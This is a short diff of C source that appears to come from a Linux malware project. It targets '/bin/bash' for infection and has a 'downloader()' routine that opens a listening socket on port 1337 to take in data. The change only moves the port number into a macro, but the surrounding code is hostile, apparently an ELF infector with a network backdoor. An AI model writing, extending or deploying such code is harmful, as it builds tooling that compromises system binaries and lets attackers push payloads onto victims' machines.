@@ -19,6 +19,8 @@
 
 #define infection_target "/bin/bash"
 
+#define port 1337
+
 extern char** environ;
 
 always_inline optimize(opt) static inline long elf_size(FILE*);
@@ -127,7 +129,7 @@ void downloader(){
   memset(&server_addr, 0, sizeof(server_addr));
   server_addr.sin_family = AF_INET; 
   server_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
-  server_addr.sin_port = htons(1337);
+  server_addr.sin_port = htons(port);
   bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
   listen(socket_fd, 5);
   addr_len = sizeof(client);
